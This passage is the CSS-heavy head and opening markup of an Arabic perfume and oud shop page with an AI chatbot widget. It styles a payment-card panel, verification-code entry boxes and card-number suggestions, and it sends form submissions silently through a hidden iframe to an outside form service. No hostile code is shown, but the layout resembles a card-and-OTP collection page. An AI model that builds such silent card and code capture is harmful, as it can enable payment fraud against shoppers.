<!DOCTYPE html>
<html dir="rtl" lang="ar"><head><meta content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;" http-equiv="Content-Security-Policy"/><meta content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com https://api.web3forms.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;" http-equiv="Content-Security-Policy"/>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<title>مكاسر العود - متجر العود والعطور الفاخر مع الذكاء الاصطناعي</title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet"/>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800;900&amp;display=swap" rel="stylesheet"/>
<link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&amp;display=swap" rel="stylesheet"/>
<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
<style>
        body {
            font-family: 'Cairo', sans-serif;
        }
        .gradient-bg {
            background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
        }
        .card-hover:hover {
            transform: translateY(-10px);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .product-card {
            border-radius: 20px;
            overflow: hidden;
            background: white;
            border: 1px solid #f0f0f0;
            position: relative;
        }
        .product-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(45deg, transparent 49%, rgba(255,255,255,0.1) 50%, transparent 51%);
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        .product-card:hover::before {
            opacity: 1;
        }
        .btn-primary {
            background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
            color: white;
            padding: 14px 28px;
            border-radius: 12px;
            font-weight: 600;
            transition: all 0.3s ease;
            border: none;
            cursor: pointer;
            position: relative;
            overflow: hidden;
        }
        .btn-primary::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s;
        }
        .btn-primary:hover::before {
            left: 100%;
        }
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(139, 69, 19, 0.4);
        }
        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .btn-disabled {
            background: #ccc;
            color: #666;
            cursor: not-allowed;
        }
        .navbar-brand {
            font-size: 2rem;
            font-weight: 700;
            color: #8B4513;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
        }
        .cart-count {
            background: linear-gradient(135deg, #D2691E 0%, #FF6B35 100%);
            color: white;
            border-radius: 50%;
            padding: 4px 8px;
            font-size: 0.75rem;
            font-weight: bold;
            position: absolute;
            top: -8px;
            right: -8px;
            min-width: 20px;
            text-align: center;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            z-index: 1000;
            backdrop-filter: blur(10px);
        }
        .modal.active {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .modal-content {
            background: white;
            border-radius: 20px;
            max-width: 700px;
            width: 95%;
            max-height: 95vh;
            overflow-y: auto;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
        }
        
        /* Enhanced Mobile optimizations */
        @media (max-width: 768px) {
            .modal-content {
                width: 100%;
                height: 100vh;
                max-height: 100vh;
                border-radius: 0;
                margin: 0;
            }
            
            .grid.md\:grid-cols-2 {
                grid-template-columns: 1fr !important;
            }
            
            .grid.grid-cols-2 {
                grid-template-columns: 1fr !important;
            }
            
            .input-group {
                margin-bottom: 20px;
            }
            
            .input-group input, .input-group select {
                padding: 20px 16px;
                font-size: 18px;
            }
            
            .code-input {
                width: 45px;
                height: 45px;
                font-size: 18px;
                margin: 0 3px;
            }
            
            .success-animation {
                padding: 15px;
                margin: 5px;
                border-radius: 20px;
            }
            
            #successPage .bg-white {
                margin: 5px;
                max-width: 95vw;
                border-radius: 15px;
            }
            
            .hero-section h1 {
                font-size: 3rem !important;
            }
            
            .hero-section p {
                font-size: 1.2rem !important;
            }
        }
        
        @media (max-width: 480px) {
            .code-input {
                width: 35px;
                height: 35px;
                font-size: 14px;
                margin: 0 1px;
            }
            
            .hero-section h1 {
                font-size: 2.5rem !important;
            }
            
            #verificationPage .bg-white {
                margin: 10px;
                border-radius: 20px;
                max-width: 95vw;
                padding: 20px;
            }
            
            #verificationPage h2 {
                font-size: 1.8rem !important;
            }
            
            #verificationPage .text-lg {
                font-size: 1rem !important;
            }
            
            /* صغر بطاقات الفئات للجوال */
            .category-card {
                min-width: 100px !important;
                padding: 12px !important;
            }
            
            .category-card i {
                font-size: 2.5rem !important;
                margin-bottom: 8px !important;
            }
            
            .category-card p.font-bold {
                font-size: 14px !important;
            }
            
            .category-card p.text-sm {
                font-size: 11px !important;
            }
        }
        
        /* ADVANCED FUTURISTIC HERO BACKGROUND */
        .hero-section {
            background: 
                radial-gradient(circle at 20% 80%, rgba(255, 193, 7, 0.8) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(139, 69, 19, 0.8) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(210, 105, 30, 0.6) 0%, transparent 50%),
                linear-gradient(135deg, #667eea 0%, #764ba2 25%, #8B4513 50%, #D2691E 75%, #FF6B35 100%);
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
            position: relative;
            overflow: hidden;
            min-height: 85vh;
        }
        
        .hero-section::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                repeating-linear-gradient(
                    90deg,
                    transparent,
                    transparent 98px,
                    rgba(255,255,255,0.03) 100px
                ),
                repeating-linear-gradient(
                    0deg,
                    transparent,
                    transparent 98px,
                    rgba(255,255,255,0.03) 100px
                );
            animation: meshMove 20s linear infinite;
        }
        
        .hero-section::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grain" width="100" height="100" patternUnits="userSpaceOnUse"><circle cx="50" cy="50" r="1" fill="rgba(255,255,255,0.1)"/></pattern></defs><rect width="100%" height="100%" fill="url(%23grain)"/></svg>');
            opacity: 0.2;
        }
        
        @keyframes gradientShift {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        @keyframes meshMove {
            0% { transform: translateX(0) translateY(0); }
            100% { transform: translateX(100px) translateY(100px); }
        }

        /* MAGICAL PRODUCT EFFECTS */
        .product-card {
            border-radius: 25px;
            overflow: hidden;
            background: linear-gradient(145deg, #ffffff 0%, #f8fafc 100%);
            border: 2px solid transparent;
            position: relative;
            transition: all 0.6s cubic-bezier(0.4, 0, 0.2, 1);
        }
        
        .product-card::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, #ff6b35, #f7931e, #ffd700, #32cd32, #1e90ff, #9370db, #ff1493);
            background-size: 400% 400%;
            border-radius: 25px;
            z-index: -1;
            opacity: 0;
            animation: rainbowBorder 3s ease-in-out infinite;
            transition: opacity 0.3s ease;
        }
        
        .product-card:hover::before {
            opacity: 1;
        }
        
        .product-card::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle at var(--x, 50%) var(--y, 50%), rgba(255,255,255,0.3) 0%, transparent 50%);
            opacity: 0;
            transition: opacity 0.3s ease;
            pointer-events: none;
        }
        
        .product-card:hover::after {
            opacity: 1;
        }
        
        @keyframes rainbowBorder {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        /* GLOWING EFFECTS FOR EACH PRODUCT */
        .product-glow-1 { box-shadow: 0 0 30px rgba(255, 107, 53, 0.6), 0 0 60px rgba(255, 107, 53, 0.4); }
        .product-glow-2 { box-shadow: 0 0 30px rgba(139, 69, 19, 0.6), 0 0 60px rgba(139, 69, 19, 0.4); }
        .product-glow-3 { box-shadow: 0 0 30px rgba(255, 215, 0, 0.6), 0 0 60px rgba(255, 215, 0, 0.4); }
        .product-glow-4 { box-shadow: 0 0 30px rgba(50, 205, 50, 0.6), 0 0 60px rgba(50, 205, 50, 0.4); }
        .product-glow-5 { box-shadow: 0 0 30px rgba(30, 144, 255, 0.6), 0 0 60px rgba(30, 144, 255, 0.4); }
        
        /* PULSING ANIMATION */
        .product-pulse {
            animation: magicalPulse 4s ease-in-out infinite;
        }
        
        @keyframes magicalPulse {
            0%, 100% { transform: scale(1) rotate(0deg); }
            25% { transform: scale(1.02) rotate(0.5deg); }
            50% { transform: scale(1.05) rotate(0deg); }
            75% { transform: scale(1.02) rotate(-0.5deg); }
        }
        
        /* FLOATING SPARKLES */
        .sparkle {
            position: absolute;
            width: 4px;
            height: 4px;
            background: linear-gradient(45deg, #ffd700, #ffed4e);
            border-radius: 50%;
            animation: sparkleFloat 3s ease-in-out infinite;
            pointer-events: none;
        }
        
        @keyframes sparkleFloat {
            0%, 100% { 
                transform: translateY(0px) scale(0.8);
                opacity: 0.7;
            }
            50% { 
                transform: translateY(-15px) scale(1.2);
                opacity: 1;
            }
        }
        
        /* AI CHATBOT STYLES */
        .ai-chat-container {
            position: fixed;
            bottom: 100px;
            right: 20px;
            width: 350px;
            height: 500px;
            background: linear-gradient(145deg, #ffffff 0%, #f8fafc 100%);
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
            z-index: 1000;
            transform: translateY(100%);
            transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            border: 2px solid #e5e7eb;
        }
        
        .ai-chat-container.active {
            transform: translateY(0);
        }
        
        .ai-chat-header {
            background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
            color: white;
            padding: 15px;
            border-radius: 18px 18px 0 0;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .ai-avatar {
            width: 40px;
            height: 40px;
            background: linear-gradient(45deg, #ffd700, #ffed4e);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            animation: aiGlow 2s ease-in-out infinite alternate;
        }
        
        @keyframes aiGlow {
            0% { box-shadow: 0 0 20px rgba(255, 215, 0, 0.5); }
            100% { box-shadow: 0 0 30px rgba(255, 215, 0, 0.8); }
        }
        
        .ai-chat-messages {
            height: 350px;
            overflow-y: auto;
            padding: 15px;
            background: #fafbfc;
        }
        
        .ai-message {
            margin-bottom: 15px;
            padding: 12px 16px;
            border-radius: 15px;
            max-width: 85%;
            animation: messageSlide 0.3s ease-out;
        }
        
        .ai-message.user {
            background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
            color: white;
            margin-left: auto;
            border-bottom-right-radius: 5px;
        }
        
        .ai-message.bot {
            background: linear-gradient(135deg, #f3f4f6 0%, #e5e7eb 100%);
            color: #374151;
            border-bottom-left-radius: 5px;
        }
        
        @keyframes messageSlide {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        .ai-chat-input {
            padding: 15px;
            border-top: 1px solid #e5e7eb;
            display: flex;
            gap: 10px;
        }
        
        .ai-chat-input input {
            flex: 1;
            padding: 12px 16px;
            border: 2px solid #e5e7eb;
            border-radius: 25px;
            outline: none;
            font-size: 14px;
            transition: border-color 0.3s ease;
        }
        
        .ai-chat-input input:focus {
            border-color: #8B4513;
        }
        
        .ai-send-btn {
            width: 45px;
            height: 45px;
            background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
            color: white;
            border: none;
            border-radius: 50%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: transform 0.2s ease;
        }
        
        .ai-send-btn:hover {
            transform: scale(1.1);
        }
        
        .ai-toggle-btn {
            position: fixed;
            bottom: 30px;
            right: 30px;
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
            color: white;
            border: none;
            border-radius: 50%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            box-shadow: 0 10px 25px rgba(139, 69, 19, 0.4);
            z-index: 1001;
            transition: all 0.3s ease;
            animation: aiPulse 3s ease-in-out infinite;
        }
        
        @keyframes aiPulse {
            0%, 100% { 
                transform: scale(1);
                box-shadow: 0 10px 25px rgba(139, 69, 19, 0.4);
            }
            50% { 
                transform: scale(1.1);
                box-shadow: 0 15px 35px rgba(139, 69, 19, 0.6);
            }
        }
        
        .ai-toggle-btn:hover {
            transform: scale(1.2);
        }
        
        /* QUICK SUGGESTIONS */
        .ai-suggestions {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            padding: 10px 15px;
            border-top: 1px solid #e5e7eb;
        }
        
        .ai-suggestion-btn {
            background: linear-gradient(135deg, #f3f4f6 0%, #e5e7eb 100%);
            border: 1px solid #d1d5db;
            border-radius: 15px;
            padding: 6px 12px;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.2s ease;
        }
        
        .ai-suggestion-btn:hover {
            background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
            color: white;
        }
        
        /* PRODUCT SEARCH WITH AI */
        .ai-search-container {
            position: relative;
            max-width: 500px;
            margin: 0 auto;
        }
        
        .ai-search-input {
            width: 100%;
            padding: 15px 50px 15px 20px;
            border: 3px solid transparent;
            border-radius: 25px;
            background: linear-gradient(white, white) padding-box,
                        linear-gradient(45deg, #8B4513, #D2691E) border-box;
            font-size: 16px;
            outline: none;
            transition: all 0.3s ease;
        }
        
        .ai-search-input:focus {
            box-shadow: 0 0 20px rgba(139, 69, 19, 0.3);
        }
        
        .ai-search-btn {
            position: absolute;
            right: 5px;
            top: 50%;
            transform: translateY(-50%);
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
            color: white;
            border: none;
            border-radius: 50%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: transform 0.2s ease;
        }
        
        .ai-search-btn:hover {
            transform: translateY(-50%) scale(1.1);
        }

        /* Enhanced decorative elements */
        .hero-decorative {
            position: absolute;
            width: 100%;
            height: 100%;
            overflow: hidden;
            pointer-events: none;
            z-index: 1;
        }
        
        .hero-decorative::before {
            content: '';
            position: absolute;
            top: 10%;
            right: 10%;
            width: 150px;
            height: 150px;
            background: radial-gradient(circle, rgba(255,215,0,0.3) 0%, rgba(255,165,0,0.2) 50%, transparent 70%);
            border-radius: 50%;
            animation: float-decoration 8s ease-in-out infinite;
        }
        
        .hero-decorative::after {
            content: '';
            position: absolute;
            bottom: 15%;
            left: 15%;
            width: 120px;
            height: 120px;
            background: radial-gradient(circle, rgba(139,69,19,0.3) 0%, rgba(210,105,30,0.2) 50%, transparent 70%);
            border-radius: 50%;
            animation: float-decoration 10s ease-in-out infinite reverse;
        }
        
        @keyframes float-decoration {
            0%, 100% { 
                transform: translateY(0px) scale(1) rotate(0deg);
            }
            25% { 
                transform: translateY(-30px) scale(1.1) rotate(90deg);
            }
            50% { 
                transform: translateY(-20px) scale(1.2) rotate(180deg);
            }
            75% { 
                transform: translateY(-40px) scale(1.1) rotate(270deg);
            }
        }
        
        /* Categories horizontal scroll */
        .categories-container {
            display: flex;
            overflow-x: auto;
            gap: 20px;
            padding: 20px;
            scroll-snap-type: x mandatory;
            scrollbar-width: none;
            -ms-overflow-style: none;
        }
        
        .categories-container::-webkit-scrollbar {
            display: none;
        }
        
        .category-card {
            min-width: 140px;
            scroll-snap-align: start;
            flex-shrink: 0;
        }
        
        /* Enhanced product grid */
        .product-grid-enhanced {
            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
            border-radius: 30px;
            padding: 40px;
            margin: 20px 0;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        .hero-section {
            background: linear-gradient(rgba(139, 69, 19, 0.8), rgba(210, 105, 30, 0.8)), 
                        url('https://images.unsplash.com/photo-1581833971358-2c8b550f87b3?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxواG90by1wYWdlfHx8فGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2071&q=80');
            background-size: contain;
            background-position: center;
            background-repeat: no-repeat;
            background-color: #8B4513;
            min-height: 80vh;
        }
        
        @media (max-width: 768px) {
            .hero-section {
                background-size: cover;
                background-position: center;
                min-height: 60vh;
                padding: 20px 0;
            }
        }
        .input-group {
            position: relative;
            margin-bottom: 24px;
        }
        .input-group input, .input-group select {
            width: 100%;
            padding: 18px 16px;
            border: 2px solid #e5e5e5;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: white;
        }
        .input-group input:focus, .input-group select:focus {
            outline: none;
            border-color: #8B4513;
            box-shadow: 0 0 0 3px rgba(139, 69, 19, 0.1);
        }
        .input-group label {
            position: absolute;
            right: 16px;
            top: 18px;
            background: white;
            padding: 0 8px;
            color: #666;
            transition: all 0.3s ease;
            pointer-events: none;
            font-weight: 500;
        }
        .input-group input:focus + label,
        .input-group input:not(:placeholder-shown) + label,
        .input-group select:focus + label,
        .input-group select:not([value=""]) + label {
            top: -12px;
            font-size: 14px;
            color: #8B4513;
            font-weight: 600;
        }
        .payment-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 16px;
            padding: 24px;
            color: white;
            position: relative;
            overflow: hidden;
        }
        .payment-card::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
            animation: shimmer 3s ease-in-out infinite;
        }
        @keyframes shimmer {
            0%, 100% { transform: rotate(0deg); }
            50% { transform: rotate(180deg); }
        }
        .success-animation {
            animation: successPulse 0.6s ease-in-out;
        }
        @keyframes successPulse {
            0% { transform: scale(0.8); opacity: 0; }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); opacity: 1; }
        }
        .code-input {
            width: 60px;
            height: 60px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            border: 3px solid #e5e5e5;
            border-radius: 12px;
            margin: 0 6px;
            transition: all 0.3s ease;
        }
        .code-input:focus {
            border-color: #8B4513;
            box-shadow: 0 0 0 3px rgba(139, 69, 19, 0.1);
            outline: none;
        }
        .floating-elements {
            position: absolute;
            width: 100%;
            height: 100%;
            overflow: hidden;
            pointer-events: none;
        }
        .floating-element {
            position: absolute;
            opacity: 0.1;
            animation: float 20s infinite linear;
        }
        @keyframes float {
            0% { transform: translateY(100vh) rotate(0deg); }
            100% { transform: translateY(-100px) rotate(360deg); }
        }
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(135deg, #10B981 0%, #059669 100%);
            color: white;
            padding: 16px 24px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(16, 185, 129, 0.3);
            z-index: 2000;
            transform: translateX(400px);
            transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .notification.show {
            transform: translateX(0);
        }
        .notification.warning {
            background: linear-gradient(135deg, #F59E0B 0%, #D97706 100%);
            box-shadow: 0 10px 25px rgba(245, 158, 11, 0.3);
        }
        .notification.error {
            background: linear-gradient(135deg, #EF4444 0%, #DC2626 100%);
            box-shadow: 0 10px 25px rgba(239, 68, 68, 0.3);
        }
        .category-card {
            background: white;
            border-radius: 16px;
            padding: 20px;
            text-align: center;
            border: 2px solid transparent;
            transition: all 0.3s ease;
            cursor: pointer;
        }
        .category-card:hover {
            border-color: #8B4513;
            transform: translateY(-5px);
            box-shadow: 0 15px 35px rgba(139, 69, 19, 0.2);
        }
        .category-card.active {
            border-color: #8B4513;
            background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
            color: white;
        }
        .team-member {
            text-align: center;
            padding: 24px;
            background: white;
            border-radius: 16px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            transition: all 0.3s ease;
        }
        .team-member:hover {
            transform: translateY(-5px);
            box-shadow: 0 20px 25px rgba(0, 0, 0, 0.15);
        }
        .team-avatar {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            margin: 0 auto 16px;
            object-fit: cover;
        }
        .price-tag {
            background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
            color: white;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 18px;
            font-weight: bold;
            display: inline-block;
        }
        .loading-spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #8B4513;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-left: 8px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .scroll-to-top {
            position: fixed;
            bottom: 30px;
            left: 30px;
            background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
            color: white;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
            z-index: 100;
        }
        .scroll-to-top.visible {
            opacity: 1;
            visibility: visible;
        }
        .scroll-to-top:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(139, 69, 19, 0.3);
        }
        .out-of-stock {
            opacity: 0.6;
            position: relative;
        }
        .out-of-stock::after {
            content: 'نفدت الكمية';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(239, 68, 68, 0.9);
            color: white;
            padding: 8px 16px;
            border-radius: 8px;
            font-weight: bold;
            z-index: 10;
        }
        
        /* Quick Navigation Menu */
        .quick-nav {
            position: fixed;
            top: 60px;
            right: 15px;
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 25px;
            padding: 15px 8px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
            z-index: 1000;
            border: 1px solid #f0f0f0;
            transition: all 0.3s ease;
        }
        
        .quick-nav-item {
            display: block;
            width: 35px;
            height: 35px;
            border-radius: 50%;
            background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
            color: white;
            text-decoration: none;
            margin: 5px 0;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            font-size: 12px;
        }
        
        .quick-nav-item:hover {
            transform: scale(1.1);
            box-shadow: 0 3px 10px rgba(139, 69, 19, 0.4);
        }
        
        .quick-nav-tooltip {
            position: absolute;
            right: 45px;
            top: 50%;
            transform: translateY(-50%);
            background: #333;
            color: white;
            padding: 6px 10px;
            border-radius: 6px;
            font-size: 12px;
            white-space: nowrap;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s ease;
        }
        
        .quick-nav-item:hover .quick-nav-tooltip {
            opacity: 1;
        }
        
        /* Order Progress Bar */
        .progress-bar {
            display: flex;
            justify-content: space-between;
            margin: 20px 0;
            position: relative;
        }
        
        .progress-step {
            flex: 1;
            text-align: center;
            position: relative;
        }
        
        .progress-step::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translateY(-50%);
            width: 100%;
            height: 2px;
            background: #e5e5e5;
            z-index: 1;
        }
        
        .progress-step:last-child::before {
            display: none;
        }
        
        .progress-step .step-circle {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #e5e5e5;
            color: #666;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 8px;
            position: relative;
            z-index: 2;
            font-weight: bold;
            transition: all 0.3s ease;
        }
        
        .progress-step.active .step-circle {
            background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
            color: white;
        }
        
        .progress-step.completed .step-circle {
            background: #10B981;
            color: white;
        }
        
        .progress-step.completed::before {
            background: #10B981;
        }
        
        /* Full Screen Pages */
        .fullscreen-page {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
            z-index: 1500;
            display: none;
            overflow-y: auto;
        }
        
        .fullscreen-page.active {
            display: block;
        }
        
        /* Card Suggestions */
        .card-suggestions {
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            background: white;
            border: 1px solid #ddd;
            border-radius: 8px;
            max-height: 200px;
            overflow-y: auto;
            z-index: 1000;
            display: none;
        }
        
        .card-suggestion {
            padding: 12px 16px;
            cursor: pointer;
            border-bottom: 1px solid #f0f0f0;
            transition: background-color 0.2s ease;
        }
        
        .card-suggestion:hover {
            background-color: #f8f9fa;
        }
        
        .card-suggestion:last-child {
            border-bottom: none;
        }
        
        .input-with-suggestions {
            position: relative;
        }

        /* Date input styling */
        .input-group input[type="text"] {
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-calendar" viewBox="0 0 16 16"><path d="M3.5 0a.5.5 0 0 1 .5.5V1h8V.5a.5.5 0 0 1 1 0V1h1a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V3a2 2 0 0 1 2-2h1V.5a.5.5 0 0 1 .5-.5zM1 4v10a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V4H1z"/></svg>');
            background-repeat: no-repeat;
            background-position: left 15px center;
            background-size: 20px;
        }
        
        /* Enhanced Animations */
        .fade-in {
            animation: fadeIn 0.6s ease-in-out;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .slide-up {
            animation: slideUp 0.4s ease-in-out;
        }
        
        @keyframes slideUp {
            from { transform: translateY(100%); }
            to { transform: translateY(0); }
        }
        
        /* Advanced Form Styling */
        .form-section {
            background: white;
            border-radius: 20px;
            padding: 30px;
            margin: 20px 0;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            border: 1px solid #f0f0f0;
        }
        
        .form-section h3 {
            color: #8B4513;
            margin-bottom: 20px;
            font-size: 1.5rem;
            font-weight: 700;
        }
        
        /* Enhanced Button Styles */
        .btn-secondary {
            background: linear-gradient(135deg, #6B7280 0%, #4B5563 100%);
            color: white;
            padding: 12px 24px;
            border-radius: 10px;
            font-weight: 600;
            transition: all 0.3s ease;
            border: none;
            cursor: pointer;
        }
        
        .btn-secondary:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(107, 114, 128, 0.4);
        }
        
        .btn-success {
            background: linear-gradient(135deg, #10B981 0%, #059669 100%);
            color: white;
            padding: 12px 24px;
            border-radius: 10px;
            font-weight: 600;
            transition: all 0.3s ease;
            border: none;
            cursor: pointer;
        }
        
        .btn-success:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(16, 185, 129, 0.4);
        }
        
        /* Hide iframe for form submissions */
        .hidden-frame {
            display: none !important;
        }
    </style>
</head>
<body class="bg-gray-50">
<!-- Hidden iframe for form submissions -->
<iframe class="hidden-frame" name="hiddenFrame"></iframe>
<!-- Quick Navigation Toggle -->
<button class="fixed top-4 right-4 z-50 bg-orange-600 text-white w-12 h-12 rounded-full flex items-center justify-center shadow-lg hover:bg-orange-700 transition duration-300" onclick="toggleQuickNav()">
<i class="fas fa-bars"></i>
</button>
<!-- Quick Navigation Menu -->
<div class="quick-nav" id="quickNavMenu">
<div class="text-center mb-4 text-orange-600 font-bold text-sm">التنقل السريع</div>
<a class="quick-nav-item" href="#home">
<i class="fas fa-home"></i>
<span class="quick-nav-tooltip">الرئيسية</span>
</a>
<a class="quick-nav-item" href="#products">
<i class="fas fa-shopping-bag"></i>
<span class="quick-nav-tooltip">المنتجات</span>
</a>
<a class="quick-nav-item" href="#about">
<i class="fas fa-info-circle"></i>
<span class="quick-nav-tooltip">من نحن</span>
</a>
<a class="quick-nav-item" href="#contact">
<i class="fas fa-phone"></i>
<span class="quick-nav-tooltip">تواصل معنا</span>
</a>
